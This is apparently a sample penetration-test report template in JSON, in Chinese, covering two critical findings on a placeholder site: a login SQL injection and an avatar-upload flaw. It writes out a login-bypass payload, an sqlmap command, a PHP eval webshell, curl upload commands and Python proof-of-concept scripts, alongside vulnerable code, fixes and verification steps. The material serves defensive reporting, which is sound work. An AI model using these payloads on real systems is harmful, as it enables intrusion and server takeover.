@@ -1,0 +1,225 @@
+{
+  "project": {
+    "classification": "内部",
+    "client": "示例科技有限公司",
+    "tester": "CyberStrikeAI 安全团队",
+    "project_name": "XX业务系统渗透测试",
+    "doc_id": "CST-2024-PT-001",
+    "version": "1.0",
+    "date": "2024年12月25日",
+    "overview": "本次渗透测试针对XX业务系统进行全面安全评估，共发现2个严重漏洞。",
+    "key_critical_finding": "发现SQL注入漏洞和任意文件上传漏洞，需立即修复。",
+    "key_high_finding": "系统整体安全防护薄弱。",
+    "overall_rating": "高风险",
+    "overall_conclusion": "建议立即启动应急修复流程。",
+    "test_type": "黑盒测试 + 灰盒测试",
+    "test_standards": [
+      "OWASP Top 10 (2021)",
+      "OWASP WSTG v4.2",
+      "PTES"
+    ],
+    "timeline": [
+      {
+        "date": "2024-12-18",
+        "event": "项目启动"
+      },
+      {
+        "date": "2024-12-19 ~ 12-24",
+        "event": "测试执行"
+      },
+      {
+        "date": "2024-12-25",
+        "event": "报告编写"
+      }
+    ],
+    "team": [
+      {
+        "name": "张安全",
+        "role": "渗透测试工程师",
+        "duty": "Web应用测试、漏洞利用"
+      }
+    ],
+    "scope": [
+      {
+        "category": "Web应用",
+        "target": "https://example.com",
+        "note": "主站"
+      }
+    ],
+    "tools": [
+      {
+        "name": "Burp Suite Pro",
+        "version": "2024.12",
+        "purpose": "Web应用安全测试"
+      },
+      {
+        "name": "SQLMap",
+        "version": "1.8",
+        "purpose": "SQL注入检测"
+      }
+    ],
+    "compliance": [
+      {
+        "vuln_id": "VULN-2024-001",
+        "cwe": "CWE-89",
+        "owasp": "A03:2021 - 注入",
+        "grade_protection": "安全计算环境-入侵防范"
+      }
+    ],
+    "long_term_improvements": [
+      "建立SDL流程",
+      "定期渗透测试",
+      "部署WAF"
+    ]
+  },
+  "vulnerabilities": [
+    {
+      "id": "VULN-2024-001",
+      "title": "登录接口SQL注入漏洞",
+      "type": "SQL注入",
+      "severity": "critical",
+      "cvss_score": "9.8",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "cvss_detail": {
+        "AV": "N",
+        "AC": "L",
+        "PR": "N",
+        "UI": "N",
+        "S": "U",
+        "C": "H",
+        "I": "H",
+        "A": "H"
+      },
+      "url": "https://example.com/api/login",
+      "parameter": "username",
+      "date": "2024-12-23",
+      "description": "在登录接口的username参数中发现SQL注入漏洞。攻击者可利用此漏洞绕过认证、获取数据库中所有用户数据。",
+      "impact": "攻击者可无需认证直接获取数据库全部数据，并可进一步利用数据库权限执行操作系统命令。",
+      "prerequisites": [
+        "目标系统可网络访问",
+        "存在登录接口"
+      ],
+      "reproduction_steps": [
+        {
+          "title": "访问登录接口",
+          "description": "使用Burp Suite拦截登录请求",
+          "command": "POST /api/login HTTP/1.1\nHost: example.com\n\nusername=admin&password=test"
+        },
+        {
+          "title": "注入SQL Payload",
+          "description": "在username参数中插入SQL注入Payload",
+          "command": "username=admin' OR '1'='1' --"
+        },
+        {
+          "title": "SQLMap利用",
+          "description": "使用SQLMap自动化获取数据库",
+          "command": "sqlmap -u https://example.com/api/login --data='username=admin&password=test' --dbs"
+        }
+      ],
+      "http_request": "POST /api/login HTTP/1.1\nHost: example.com\n\nusername=admin' OR '1'='1' --&password=test",
+      "http_response": "HTTP/1.1 200 OK\nSet-Cookie: session=xxx\n\n{\"status\":\"success\",\"token\":\"admin_jwt\"}",
+      "poc": "import requests\nurl = 'https://example.com/api/login'\ndata = {'username': \"admin' OR '1'='1' --\", 'password': 'test'}\nr = requests.post(url, data=data)\nprint(r.json())",
+      "poc_language": "python",
+      "temporary_fix": "1. WAF添加SQL注入检测规则\n2. 限制登录频率\n3. 数据库用户降权",
+      "fix_description": "使用参数化查询替代字符串拼接。",
+      "code_before": "username = request.form['username']\nquery = f\"SELECT * FROM users WHERE username='{username}'\"\ncursor.execute(query)",
+      "code_after": "username = request.form['username']\nquery = \"SELECT * FROM users WHERE username=?\"\ncursor.execute(query, (username,))",
+      "code_language": "python",
+      "fix_changes": [
+        "字符串拼接改为参数化查询",
+        "使用?占位符",
+        "参数以元组传入"
+      ],
+      "hardening": [
+        "使用ORM框架",
+        "最小权限原则",
+        "密码使用bcrypt哈希"
+      ],
+      "verification_steps": [
+        "使用原始Payload测试",
+        "SQLMap扫描验证",
+        "代码审查确认"
+      ],
+      "verification_expected": "注入Payload被当作普通字符串，返回'用户名或密码错误'。",
+      "references": [
+        "CWE-89",
+        "OWASP SQL Injection Prevention Cheat Sheet"
+      ],
+      "priority": "P0",
+      "status": "未修复"
+    },
+    {
+      "id": "VULN-2024-002",
+      "title": "头像上传接口任意文件上传漏洞",
+      "type": "文件上传",
+      "severity": "critical",
+      "cvss_score": "9.1",
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+      "cvss_detail": {
+        "AV": "N",
+        "AC": "L",
+        "PR": "N",
+        "UI": "N",
+        "S": "U",
+        "C": "H",
+        "I": "H",
+        "A": "H"
+      },
+      "url": "https://example.com/api/upload/avatar",
+      "parameter": "file",
+      "date": "2024-12-23",
+      "description": "头像上传接口未校验文件类型，可上传Webshell获取服务器控制权。",
+      "impact": "攻击者可上传恶意脚本，获取服务器权限，横向移动攻击内网。",
+      "prerequisites": [
+        "存在文件上传功能"
+      ],
+      "reproduction_steps": [
+        {
+          "title": "构造Webshell",
+          "description": "创建PHP一句话木马",
+          "command": "echo '<?php @eval($_POST[cmd]);?>' > shell.php"
+        },
+        {
+          "title": "上传Webshell",
+          "description": "通过接口上传",
+          "command": "curl -F 'file=@shell.php' https://example.com/api/upload/avatar"
+        },
+        {
+          "title": "连接Webshell",
+          "description": "蚁剑/冰蝎连接",
+          "command": "https://example.com/uploads/shell.php 密码:cmd"
+        }
+      ],
+      "http_request": "POST /api/upload/avatar HTTP/1.1\nContent-Type: multipart/form-data\n\n...filename=\"shell.php\"...\n<?php @eval($_POST[cmd]);?>",
+      "http_response": "HTTP/1.1 200 OK\n\n{\"url\":\"/uploads/shell.php\"}",
+      "poc": "import requests\nfiles = {'file': ('shell.php', '<?php @eval($_POST[cmd]);?>')}\nr = requests.post('https://example.com/api/upload/avatar', files=files)\nprint(r.json())",
+      "poc_language": "python",
+      "temporary_fix": "1. WAF拦截脚本后缀\n2. 关闭上传功能",
+      "fix_description": "实施文件类型白名单校验，检测Magic Number，上传目录禁止脚本执行。",
+      "code_before": "file = request.files['file']\nfile.save('/var/www/uploads/' + file.filename)",
+      "code_after": "import magic, uuid\nALLOWED = {'jpg','png','gif'}\nfile = request.files['file']\nif file and file.filename.rsplit('.',1)[1].lower() in ALLOWED:\n    mime = magic.from_buffer(file.read(2048), mime=True)\n    if mime in {'image/jpeg','image/png','image/gif'}:\n        file.seek(0)\n        file.save('/var/www/uploads/' + uuid.uuid4().hex + '.jpg')",
+      "code_language": "python",
+      "fix_changes": [
+        "文件扩展名白名单",
+        "MIME类型检测",
+        "UUID重命名"
+      ],
+      "hardening": [
+        "上传目录禁止脚本执行",
+        "限制文件大小",
+        "病毒扫描"
+      ],
+      "verification_steps": [
+        "上传.php文件测试",
+        "上传含PHP代码的.jpg测试"
+      ],
+      "verification_expected": "非图片文件被拒绝。",
+      "references": [
+        "CWE-434",
+        "OWASP File Upload Cheat Sheet"
+      ],
+      "priority": "P0",
+      "status": "未修复"
+    }
+  ]
+}
